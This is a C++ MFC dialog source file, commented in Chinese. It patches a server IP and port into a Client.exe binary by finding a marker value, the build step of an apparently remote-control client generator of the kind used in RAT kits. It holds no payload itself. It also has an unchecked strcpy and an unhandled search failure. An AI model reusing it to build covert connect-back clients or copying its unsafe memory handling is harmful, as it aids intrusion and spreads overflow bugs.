// DlgCreateClient.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgCreateClient.h"
#include "afxdialogex.h"


struct  _SERVER_CONNECT_INFORMATION_
{
	DWORD   CheckFlag;
	char    ServerIP[20];
	USHORT  ServerConnectPort;
}__ServerConnectInfo = {0x87654321,"",0 };


// CDlgCreateClient 对话框

IMPLEMENT_DYNAMIC(CDlgCreateClient, CDialog)

CDlgCreateClient::CDlgCreateClient(CWnd* pParent /*=NULL*/)
	: CDialog(IDD_DIALOG_CREATE_CLIENT, pParent)
	, m_CEdit_Dialog_Create_Client_IP(_T("请输入连接IP"))
	, m_CEdit_Dialog_Create_Client_Port(_T("请输入端口号"))
{

}

CDlgCreateClient::~CDlgCreateClient()
{
}

void CDlgCreateClient::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_DIALOG_CREATE_CLIENT_IP, m_CEdit_Dialog_Create_Client_IP);
	DDX_Text(pDX, IDC_EDIT_DIALOG_CREATE_CLIENT_PORT, m_CEdit_Dialog_Create_Client_Port);
}


BEGIN_MESSAGE_MAP(CDlgCreateClient, CDialog)
	ON_BN_CLICKED(IDOK, &CDlgCreateClient::OnBnClickedOk)
END_MESSAGE_MAP()


// CDlgCreateClient 消息处理程序


void CDlgCreateClient::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	CFile  FileObject;
	//输入在控件上的数据更新到控件变量上
	UpdateData(TRUE);
	USHORT  SeverPort = atoi(m_CEdit_Dialog_Create_Client_Port);
	strcpy(__ServerConnectInfo.ServerIP, m_CEdit_Dialog_Create_Client_IP);
	if (SeverPort < 0 || SeverPort>65536)
	{
		__ServerConnectInfo.ServerConnectPort = 8888;
	}
	else
	{
		__ServerConnectInfo.ServerConnectPort = SeverPort;
	}
	char  v2[MAX_PATH];
	ZeroMemory(v2, MAX_PATH);
	LONGLONG  BufferLength = 0;
	BYTE*     BufferData = NULL;
	CString   v3;
	CString   FileFullPath;
	try
	{
		//此处得到未处理的文件名
		GetModuleFileName(NULL, v2, MAX_PATH);
		v3 = v2;
		//从右至左查询第一次出现的'\\'

		int  Position = v3.ReverseFind('\\');
		v3 = v3.Left(Position);
		//得到当前未处理文件名
		FileFullPath = v3 + "\\Client.exe";
		//打开文件
		FileObject.Open(FileFullPath, CFile::modeRead | CFile::typeBinary);
		BufferLength = FileObject.GetLength();
		BufferData = new BYTE[BufferLength];
		ZeroMemory(BufferData, BufferLength);
		//读取文件内容
		FileObject.Read(BufferData, BufferLength);
		//关闭文件
		FileObject.Close();

		//在内存中搜索0x87654321
		int  Offset = SeMemoryFind((char*)BufferData, (char*)&__ServerConnectInfo.CheckFlag,
			BufferLength, sizeof(DWORD));
		//把自己设置的信息拷贝到exe的内存中
		memcpy(BufferData + Offset, &__ServerConnectInfo, sizeof(__ServerConnectInfo));
		//保存至文件
		FileObject.Open(FileFullPath, CFile::modeRead | CFile::typeBinary | CFile::modeWrite);
		FileObject.Write(BufferData, BufferLength);
		//关闭文件
		FileObject.Close();
		delete[]  BufferData;
		MessageBox("生成成功");

	}
	catch (CMemoryException* e)
	{
		MessageBox("内存不足");
	}
	catch (CFileException* e)
	{
		MessageBox("文件操作错误");
	}
	catch (CException* e)
	{
		MessageBox("未知错误");
	}
	CDialog::OnOK();
}
int  CDlgCreateClient::SeMemoryFind(const char* BufferData, const char*  KeyValue, int BufferLength, int KeyLength)
{
	int i = 0; 
	int j = 0;
	if (KeyLength == 0 || BufferLength == 0)
	{
		return -1;
	}
	for (i = 0; i < BufferLength; i++)
	{
		for (j = 0; j < KeyLength; j++)
		{
			if (BufferData[i + j] != KeyValue[j])
			{
				break;
			}
		}
		if (j == KeyLength)
		{
			return i;
		}
	}
	return -1;
}
